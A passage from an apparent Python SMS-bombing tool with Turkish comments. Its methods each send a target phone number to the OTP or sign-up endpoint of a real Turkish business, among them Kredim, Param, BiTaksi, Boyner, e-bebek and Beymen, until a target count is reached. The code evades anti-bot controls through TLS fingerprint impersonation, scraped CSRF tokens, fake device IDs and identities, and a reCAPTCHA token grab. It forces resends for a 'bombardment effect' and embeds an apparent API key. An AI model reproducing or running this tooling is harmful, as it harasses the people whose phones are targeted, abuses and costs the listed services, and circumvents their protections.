                'Accept-Language': 'tr-TR,tr;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.terrapizza.com.tr',
                'Referer': 'https://www.terrapizza.com.tr/Customer/Passwords',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            }

            # Telefon numarası 10 haneli (5XXXXXXXXX) formatında gönderilir
            payload = {
                'Phone': self.phone
            }

            r = session.post(url, headers=headers, data=payload, timeout=12)

            if r.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Terra Pizza Başarılı! --> {self.phone}")
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> terrapizza.com.tr")
    def Kredim(self):
        if self.adet >= self.hedef:
            return True
        try:
            # TLS Bypass ve Session yönetimi
            session = crequests.Session(impersonate="chrome120")
            
            url = 'https://api.kredim.com.tr/api/v1/Communication/SendOTP'
            
            headers = {
                'accept': 'application/json',
                'accept-language': 'tr-TR,tr;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://member.kredim.com.tr',
                'referer': 'https://member.kredim.com.tr/',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1'
            }

            # Numara formatı +905XXXXXXXXX şeklinde ayarlandı
            json_data = {
                "gsmNumber": f"+90{self.phone}",
                "message": "",
                "originator": "OTP|KREDIM",
                "source": "Register",
                "templateCode": "VerifyMember",
                "type": 8
            }

            r = session.post(url, headers=headers, json=json_data, timeout=12)

            # Başarılı yanıtta adet artırılır
            if r.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Kredim Başarılı! --> {self.phone}")
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kredim.com.tr")
    
    def Param(self):
        if self.adet >= self.hedef:
            return True
        try:
            import uuid
            # TLS Bypass ve Ghost mod ayarları
            session = crequests.Session(impersonate="chrome120")
            
            url = 'https://backendkurumsal.param.com.tr/signup/otp'
            
            # Her istekte farklı bir cihaz kimliği simüle ediyoruz
            random_uuid = str(uuid.uuid4())
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9',
                'appname': 'param-kurumsal-web',
                'apptype': 'Web',
                'content-type': 'application/json',
                'deviceuuid': random_uuid,
                'origin': 'https://isyerim.param.com.tr',
                'referer': 'https://isyerim.param.com.tr/',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1'
            }

            # Telefon numarasını integer olarak gönderiyoruz
            json_data = {
                "countryCode": "+90",
                "gsmNumber": int(self.phone)
            }

            r = session.post(url, headers=headers, json=json_data, timeout=12)

            # 200 veya 201 başarılı sayılır
            if r.status_code in [200, 201]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Param Başarılı! --> {self.phone}")
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> param.com.tr")

    def Marti(self):
        if self.adet >= self.hedef:
            return True
        try:
            url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
            
            # Numarayı Martı'nın istediği formata getir (Başta 0 varsa sil)
            p = self.phone
            if p.startswith("0"):
                p = p[1:]
            
            # Çalışan ID üretme mantığın
            def generate_random_id(length=32):
                return ''.join(choice('0123456789ABCDEF') for _ in range(length))

            fake_vendor_id = f"{generate_random_id(8)}-{generate_random_id(4)}-{generate_random_id(4)}-{generate_random_id(4)}-{generate_random_id(12)}"
            fake_onesignal = f"dbDr1UEAIEj:{generate_random_id(100)}"

            headers = {
                "Host": "customer.martiscooter.com",
                "Content-Type": "application/json",
                "platform": "iOS",
                "domain-id": "1",
                "User-Agent": "Marti (com.martitech.martiscooter; build:7.4.4(74413); iOS 15.8.5)",
                "vendor-id": fake_vendor_id
            }

            payload = {
                "type": None,
                "mobilePhone": p,
                "onesignalId": fake_onesignal,
                "mobilePhoneCountryCode": "90"
            }

            # Senin çalışan orijinal requests post mantığın
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Martı Başarılı! --> {self.phone}")
            else:
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> martiscooter.com")

    def BiTaksi(self):
        if self.adet >= self.hedef:
            return True
        try:
            # BiTaksi TLS kontrolü yaptığı için crequests şart
            session = crequests.Session(impersonate="safari_ios_16_5")
            
            # Signup yerine genel giriş/kayıt tetikleyici endpoint
            url = "https://api.bitaksi.com/customer/v1/verification/send"
            
            p = self.phone
            if p.startswith("0"):
                p = p[1:]
            
            # UUID ve ID üretimini senin ana dosyadaki choice yapısına bağladım
            def gen_uuid():
                return f"{''.join(choice('abcdef0123456789') for _ in range(8))}-" \
                       f"{''.join(choice('abcdef0123456789') for _ in range(4))}-" \
                       f"{''.join(choice('abcdef0123456789') for _ in range(4))}-" \
                       f"{''.join(choice('abcdef0123456789') for _ in range(4))}-" \
                       f"{''.join(choice('abcdef0123456789') for _ in range(12))}"

            headers = {
                "Host": "api.bitaksi.com",
                "accept": "application/json",
                "content-type": "application/json",
                "user-agent": "BiTaksi/5.4.3 (iPhone; iOS 16.5; Scale/3.00)",
                "accept-language": "tr-TR,tr;q=0.9",
                "x-client-id": "ios",
                "x-request-id": gen_uuid() # Bu eksikse hata verir
            }

            payload = {
                "gsm": p,
                "areaCode": "90"
            }

            # Bazı BiTaksi versiyonları doğrudan signup isterse:
            # signup_url = "https://api.bitaksi.com/customer/v1/signup"
            
            r = session.post(url, json=payload, headers=headers, timeout=12)

            # 200 (Başarılı) veya 201 (Oluşturuldu)
            if r.status_code in [200, 201]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}BiTaksi Başarılı! --> {self.phone}")
            else:
                # Neden başarısız olduğunu görmek istersen: print(r.text)
                raise Exception
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.bitaksi.com")

    def Espressolab(self):
        if self.adet >= self.hedef:
            return True
        try:
            p = self.phone
            if not p.startswith("90"):
                p = "90" + p

            url = "https://espressolab.com/api/register"
            
            headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://espressolab.com",
                "referer": "https://espressolab.com/giris-yap/otp",
                "user-agent": "Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            }
            
            payload = {"phone": p}

            r = crequests.post(
                url, 
                json=payload, 
                headers=headers, 
                impersonate="safari_ios", 
                timeout=12
            )

            if r.status_code in [200, 201]:
                self.adet += 1
                print(f"{Fore.GREEN}[+] Espressolab: Başarılı!{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Espressolab: Başarısız!{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[-] Espressolab: Başarısız!{Style.RESET_ALL}")


    def SuperStep(self):
        if self.adet >= self.hedef:
            return True
        try:
            # CSRF Token alma işlemi
            headers_csrf = {
                "accept": "*/*",
                "user-agent": "Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
                "referer": "https://www.superstep.com.tr/users/auth/register/"
            }
            
            # Session başlatıyoruz ki çerezler korunsun
            session = crequests.Session()
            res_csrf = session.get("https://www.superstep.com.tr/api/auth/csrf", headers=headers_csrf, impersonate="safari_ios")
            token = res_csrf.json().get("csrfToken")

            if token:
                p = self.phone
                # Numara formatı kontrolü (0 ile başlıyorsa temizle veya 90 ekle)
                if p.startswith("0"):
                    p = p[1:]
                if not p.startswith("90"):
                    p = "90" + p

                url = "https://www.superstep.com.tr/api/auth/callback/default"
                
                headers_post = {
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.superstep.com.tr",
                    "referer": "https://www.superstep.com.tr/users/auth/register/",
                    "user-agent": "Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1"
                }

                # Senin ilettiğin curl verilerine göre payload
                payload = {
                    "redirect": "false",
                    "callbackUrl": "/",
                    "captchaValidated": "false",
                    "formType": "registration",
                    "locale": "tr",
                    "first_name": "memati",
                    "last_name": "necler",
                    "email": self.mail, # Class içindeki maili kullanır
                    "password": "Pass321.!",
                    "phone": "0" + p[2:], # Başına 0 ekleyerek gönderir (0507...)
                    "date_of_birth": "2001-02-12",
                    "gender": "male",
                    "is_allowed": "true",
                    "confirm": "true",
                    "permissions": "on",
                    "resend": "true",
                    "email_allowed": "true",
                    "sms_allowed": "true",
                    "call_allowed": "true",
                    "csrfToken": token,
                    "json": "true"
                }

                r = session.post(
                    url, 
                    data=payload, 
                    headers=headers_post, 
                    impersonate="safari_ios", 
                    timeout=12
                )

                # 401 hatası gelse bile SMS gittiği için başarılı sayıyoruz
                if r.status_code in [200, 201, 401]:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> superstep.com.tr")
                else:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! Status: {r.status_code} --> superstep.com.tr")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Token Alınamadı! --> superstep.com.tr")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Bağlantı Hatası! --> superstep.com.tr")

    def Moneye(self):
        if self.adet >= self.hedef:
            return True
        try:
            p = self.phone
            # Numara formatı +905xxxxxxxxx olmalı
            if p.startswith("0"):
                p = "90" + p[1:]
            if not p.startswith("90"):
                p = "90" + p
            
            url = "https://api-prd.moneye.co/auth/sign-up"
            
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "app-version": "3.25.6",
                "x-moneye-api-client-key": "58AOXPE208XI2R9ECDERW62FNR97PXXJ",
                "x-moneye-app-os": "15.8.5",
                "x-moneye-app-platform": "iOS",
                "x-moneye-app-version": "1.0.30",
                "User-Agent": "moneye/680 CFNetwork/1335.0.3.4 Darwin/21.6.0"
            }
            
            payload = {
                "firstName": "memati",
                "lastName": "aksoy",
                "birthday": "2010-02-14T19:24:58.145Z",
                "consent": {
                    "agreementAndPrivacy": True,
                    "commercialCommunication": True,
                    "statementOfResponsibility": True,
                    "olderThanLegalAge": True,
                    "explicit": True
                },
                "props": {
                    "numberOfKids": 0,
                    "gender": {
                        "id": "5e74af0e8baf654e5d4968b5",
                        "value": "300.100"
                    }
                },
                "username": "+" + p,
                "channel": "PHONE",
                "password": "Pass.321!",
                "adjustDeviceId": "0ce9ed457546e56376e61def9bc49d98"
            }

            r = crequests.post(
                url, 
                json=payload, 
                headers=headers, 
                impersonate="safari_ios", 
                timeout=12
            )

            if r.status_code == 200 and '"status":"OK"' in r.text:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> moneye.co")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! Status: {r.status_code} --> moneye.co")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Bağlantı Hatası! --> moneye.co")

    def BanabiKurye(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Telefon numarasını temizle ve 90 formatına getir
            p = self.phone
            if p.startswith("0"): p = p[1:]
            if p.startswith("90"): p = p[2:]
            full_phone = "90" + p

            # Oturum başlat (TLS ve Cookie yönetimi için)
            session = crequests.Session()
            
            # Ana sayfa header seti (Token çekmek için)
            headers_init = {
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "accept-language": "tr-TR,tr;q=0.9",
            }

            # 1. ADIM: Kayıt sayfasına git ve hem 'session' çerezini hem 'csrf' tokenı al
            # Burası kritik, direkt API'ye gidersen session oluşmadığı için reddeder.
            get_res = session.get("https://banabikurye.com/kayit", headers=headers_init, impersonate="safari15_5", timeout=10)
            
            # Regex ile CSRF token'ı sayfadan kazıyalım
            token_match = re.search(r'csrf-token"\s*content="([^"]+)"', get_res.text)
            
            if not token_match:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Token Alınamadı! --> banabikurye.com")
                return False

            csrf_token = token_match.group(1)

            # 2. ADIM: API İsteğini fırlat
            api_url = "https://banabikurye.com/user/send-sms"
            api_headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "x-csrf-token": csrf_token,
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://banabikurye.com",
                "referer": "https://banabikurye.com/kayit",
                "user-agent": headers_init["user-agent"]
            }
            
            # Curl verisindeki payload yapısı
            payload = {
                "phone": full_phone,
                "source": "signup",
                "force_sms": True # False yerine True yaparak SMS'i zorluyoruz
            }

            # POST isteği
            r = session.post(api_url, json=payload, headers=api_headers, impersonate="safari15_5", timeout=12)

            # Yanıt Analizi
            if r.status_code == 200:
                # BanabiKurye başarısını JSON içindeki is_successful anahtarından anlarız
                if '"is_successful":true' in r.text.lower():
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> banabikurye.com")
                    return True
                else:
                    # Limit dolmuşsa veya numara engelliyse buraya düşer
                    print(f"{Fore.YELLOW}[!] {Style.RESET_ALL}Limit Takıldı/Başarısız! --> banabikurye.com")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}HTTP Hata ({r.status_code}) --> banabikurye.com")
                
        except Exception:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Bağlantı Hatası! --> banabikurye.com")
        return False
    
    def Boyner(self):
        if self.adet >= self.hedef:
            return True
        try:
            p = self.phone
            if p.startswith("90"): p = p[2:]
            if p.startswith("0"): p = p[1:]
            
            session = crequests.Session()
            
            # 1. ADIM: Sistemi uyandır ve çerezleri al
            headers_base = {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            }
            session.get("https://www.boyner.com.tr/", headers=headers_base, impersonate="chrome110", timeout=10)

            # 2. ADIM: SMS Gönder
            url = "https://mpecom-apigw-prod.boyner.com.tr/mobile2/mbUser/RegisterUser"
            headers = {
                "accept": "*/*",
                "api-version": "5",
                "token": "118e2e18-3f44-4f87-bffc-a1955bd37eb7", # Sabit guest token
                "ismarketplace": "true",
                "content-type": "application/json",
                "origin": "https://www.boyner.com.tr",
                "referer": "https://www.boyner.com.tr/",
                "user-agent": headers_base["user-agent"]
            }
            
            payload = {
                "Main": {
                    "CellPhone": int(p),
                    "lastname": "Aksoy",
                    "firstname": "Memati",
                    "Email": f"bot{p}@gmail.com",
                    "Password": "Pass.123!",
                    "ReceiveCampaignMessages": True,
                    "GenderID": 1
                }
            }

            r = session.post(url, json=payload, headers=headers, impersonate="chrome110", timeout=12)

            # JSON içindeki küçük "success" harfine dikkat ederek kontrol yapıyoruz
            if r.status_code == 200 and '"Success":true' in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com.tr")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com.tr")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Bağlantı Hatası! --> boyner.com.tr")


    def EBebek(self):
        if self.adet >= self.hedef:
            return True
        try:
            p = self.phone
            if p.startswith("90"): p = p[2:]
            if p.startswith("0"): p = p[1:]
            
            session = crequests.Session()
            
            # 1. ADIM: Bearer Token Alımı
            token_url = "https://api2.e-bebek.com/authorizationserver/oauth/token"
            token_data = "client_id=trusted_client&client_secret=secret&grant_type=client_credentials"
            token_headers = {
                "content-type": "application/x-www-form-urlencoded",
                "platform": "mobileweb",
                "user-agent": "Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1"
            }
            
            r_token = session.post(token_url, data=token_data, headers=token_headers, impersonate="safari_ios")
            
            if r_token.status_code == 200:
                bearer = r_token.json().get("access_token")
                
                # 2. ADIM: İlk SMS Tetikleme (Validate)
                val_url = f"https://api2.e-bebek.com/ebebekwebservices/v2/ebebek/users/anonymous/validate?lang=tr&curr=TRY"
                headers = {
                    "authorization": f"bearer {bearer}",
                    "content-type": "application/json",
                    "platform": "mobileweb",
                    "user-agent": token_headers["user-agent"]
                }
                payload = {
                    "uid": p, "firstName": "memati", "lastName": "aksoy",
                    "email": f"bot{p}@gmail.com", "password": "Pass.321!",
                    "smsAllow": True, "emailAllow": True, "userAgreement": True, "kvkkAllow": True
                }
                session.post(val_url, json=payload, headers=headers, impersonate="safari_ios")

                # 3. ADIM: Resend OTP (Senin yakaladığın paket - Bombardıman etkisi yapar)
                resend_url = f"https://api2.e-bebek.com/ebebekwebservices/v2/ebebek/resend-otp-password?userId={p}&lang=tr&curr=TRY"
                # Bu istekte body boş (content-length: 0)
                r_resend = session.post(resend_url, headers=headers, impersonate="safari_ios", timeout=12)

                if r_resend.status_code in [200, 201]:
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! (Resend aktif) --> e-bebek.com")
                else:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> e-bebek.com")
            else:
                print(f"{Fore.LIGHTRED_EX}[-] Token Hatası! --> e-bebek.com")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] Bağlantı Hatası! --> e-bebek.com")



    def YvesRocher(self):
        if self.adet >= self.hedef:
            return True
        try:
            p = self.phone
            if p.startswith("90"): p = p[2:]
            if p.startswith("0"): p = p[1:]

            session = crequests.Session()
            
            headers = {
                "authority": "auth.yvesrocher.com.tr",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            }
            
            # CSRF Token Alımı
            res = session.get("https://auth.yvesrocher.com.tr/login", headers=headers, impersonate="safari15_5", timeout=10)
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(res.text, 'html.parser')
            csrf_token = soup.find("input", {"name": "_csrf"})
            
            if csrf_token:
                token_value = csrf_token['value']
                
                payload = {
                    "_csrf": token_value,
                    "id": "",
                    "mobilephone": p
                }
                
                post_headers = headers.copy()
                post_headers.update({
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://auth.yvesrocher.com.tr",
                    "referer": "https://auth.yvesrocher.com.tr/login"
                })

                # SMS Gönderimi
                r = session.post(
                    "https://auth.yvesrocher.com.tr/pre-register/register-by-mobile", 
                    data=payload, 
                    headers=post_headers, 
                    impersonate="safari15_5",
                    timeout=12
                )
                
                if r.status_code == 200:
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Yves Rocher Başarılı! --> {self.phone}")
                    return True
            
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! (Token Yok) --> yvesrocher.com.tr")
            return False

        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata Oluştu! --> yvesrocher.com.tr")
            return False
        
    def atasun(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Telefonu Atasun'un istediği formata getir: 0(507) 382 02 61
            p = self.phone
            if p.startswith("90"): p = p[2:]
            if p.startswith("0"): p = p[1:]
            formatted_phone = f"0({p[0:3]}) {p[3:6]} {p[6:8]} {p[8:10]}"
            
            session = crequests.Session()
            
            # 1. Aşama: reCAPTCHA Token Alımı
            site_key = "6LdzS_YUAAAAAFp-Y_S-kH-q-S-S-S-S-S"
            domain_b64 = "aHR0cHM6Ly93d3cuYXRhc3Vub3B0aWsuY29tLnRyOjQ0Mw.."
            anchor_url = f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={site_key}&co={domain_b64}&hl=tr&v=v1566851320722&size=invisible&cb=h8b5j4n3m2"
            
            r_anchor = session.get(anchor_url, impersonate="chrome124", timeout=10)
            token_match = re.search(r'id="recaptcha-token" value="(.*?)"', r_anchor.text)
            token = token_match.group(1) if token_match else "0cAFcWeA6..."

            # 2. Aşama: SMS Gönderimi
            url = "https://www.atasunoptik.com.tr/uye/sendsmsmobildev"
            
            headers = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.atasunoptik.com.tr",
                "referer": "https://www.atasunoptik.com.tr/",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }
            
            payload = {
                "Login.ReturnUrl": "",
                "Register.Name": "memati",
                "Register.Surname": "aksoy",
                "Register.Email": self.mail, # Sınıftaki maili kullanır
                "Register.Password": "Rainy0203",
                "Register.Tel": formatted_phone,
                "g-recaptcha-response": token,
                "Register.Subscribe": "true",
                "Register.IsSms": "true",
                "Register.Contract": "true"
            }

            r = session.post(url, data=payload, headers=headers, impersonate="chrome124", timeout=12)
            
            if r.status_code == 200:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Atasun Optik Başarılı! --> {self.phone}")
                return True
            
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! (Kod: {r.status_code}) --> atasunoptik.com.tr")
            return False

        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Hata Oluştu! --> atasunoptik.com.tr")
            return False
        
    def atelier_rebul(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Telefon başında 0 yoksa ekle
            p = self.phone if self.phone.startswith("0") else "0" + self.phone
            
            url = "https://www.atelierrebul.com.tr/users/register/"
            headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.atelierrebul.com.tr",
                "referer": "https://www.atelierrebul.com.tr/users/register/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
            }
            payload = {
                "email": self.mail,
                "first_name": "memati",
                "last_name": "necler",
                "date_of_birth": "1999-12-02",
                "password": "Rainy0203",
                "phone": p,
                "sms_allowed": True,
                "email_allowed": True,
                "gender": "male",
                "confirm": True,
                "kvkk_confirm": True
            }
            # 202 kabul edildiği için durumu kontrol ediyoruz
            r = crequests.post(url, json=payload, headers=headers, impersonate="chrome124", timeout=12)
            
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Atelier Rebul Başarılı! (202) --> {self.phone}")
                return True
            else:
                return False
        except:
            return False
        
    def avva(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Avva 90 ile numara istiyor
            p = "90" + self.phone if not self.phone.startswith("90") else self.phone
            
            url = "https://www.avva.com.tr/api/member/SaveMemberAndLogin"
            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json; charset=UTF-8",
                "origin": "https://www.avva.com.tr",
                "referer": "https://www.avva.com.tr/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            }
            payload = {
                "Name": "memati",
                "LastName": "aksoy",
                "Telephone": p,
                "EMail": self.mail,
                "CellPhone": p,
                "Password": "Rainy" + str(randint(100, 999)) + "!",
                "PasswordUpdate": False,
                "DateOfBirth": "01.01.1900",
                "GenderId": 2,
                "SmsAllowed": True,
                "EmailAllowed": False,
                "MemberTypeId": 1,
                "MemberSource": 1,
                "XID": "",
                "GivenOtp": "",
                "IVTVerify": False,
                "ExtraContractIds": []
            }
            
            # 200, 201 ve 202 başarılı sayılıyor
            r = crequests.post(url, json=payload, headers=headers, impersonate="chrome124", timeout=12)
            
            if r.status_code in [200, 201, 202]:
                self.adet += 1
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Avva Başarılı! (202) --> {self.phone}")
                return True
            else:
                return False
        except:
            return False
    def beymen(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Beymen için başında 0 olmayan 10 haneli numara gerekir
            p = self.phone[-10:]
            session = crequests.Session()
            
            # 1. ADIM: Kayıt sayfasından dinamik Token çekme
            index_headers = {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
            }
            
            res_index = session.get("https://www.beymenclub.com/tr/customer/register", headers=index_headers, impersonate="chrome124")
            
            # Regex ile gizli tokenı buluyoruz
            token = ""
            token_search = re.search(r'name="__RequestVerificationToken" type="hidden" value="([^"]+)"', res_index.text)
            if token_search:
                token = token_search.group(1)

            # 2. ADIM: SMS Gönderim İsteği
            api_url = "https://www.beymenclub.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification"
            api_headers = {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": "https://www.beymenclub.com",
                "referer": "https://www.beymenclub.com/tr/customer/register",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            }
            
            if token:
                api_headers["requestverificationtoken"] = token

            payload = {
                "CustomerName": "memati aksoy",
                "EmailAddress": self.mail,
                "PhoneNumber": p
            }

            r = session.post(api_url, json=payload, headers=api_headers, impersonate="chrome124", timeout=12)
            
            if r.status_code == 200:
                res_data = r.json()
                if res_data.get("Success") or res_data.get("success"):
                    self.adet += 1
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Beymen Club Başarılı! --> {self.phone}")
                    return True
                else:
                    print(f"{Fore.YELLOW}[-] {Style.RESET_ALL}Beymen Club: {res_data.get('Message', 'Hata')}")
                    return False
            return False
        except:
            return False
    def cacharel(self):
        if self.adet >= self.hedef:
            return True
        try:
            # Cacharel başında 0 olan 11 haneli numara ister
            p = self.phone
            if not p.startswith("0"):
                p = "0" + p
                
            session = crequests.Session()
            
            # 1. ADIM: Login sayfasından CSRF Token çekme
            headers_init = {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
            }
            res_init = session.get("https://www.cacharel.com.tr/login/", headers=headers_init, impersonate="chrome124")
            
            # Cookie içindeki csrftoken'ı alıyoruz
            csrf_token = session.cookies.get("csrftoken")

            if not csrf_token:
                return False

            # 2. ADIM: Kayıt isteği atarak SMS tetikleme
            api_url = "https://www.cacharel.com.tr/users/registration/"
            headers_api = {
                "accept": "*/*",
                "content-type": "application/json; charset=UTF-8",
                "origin": "https://www.cacharel.com.tr",
                "referer": "https://www.cacharel.com.tr/login/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                "x-csrftoken": csrf_token,
                "x-requested-with": "XMLHttpRequest"
            }

            payload = {
                "csrfmiddlewaretoken": csrf_token,
                "first_name": "memati",
                "last_name": "aksoy",
                "email": self.mail,
                "phone": p,
                "date_of_birth": "1985-03-22",
                "password": "Rainy" + str(randint(100, 999)) + "!",
                "password2": "Rainy" + str(randint(100, 999)) + "!",
                "confirm": "true",
                "sms_allowed": True,
                "email_allowed": True,
                "call_allowed": True
            }

            r = session.post(api_url, json=payload, headers=headers_api, impersonate="chrome124", timeout=12)
            
            # 200 (OK) veya 202 (Accepted) kodlarının ikisi de başarılıdır
            if r.status_code in [200, 202]:
                self.adet += 1
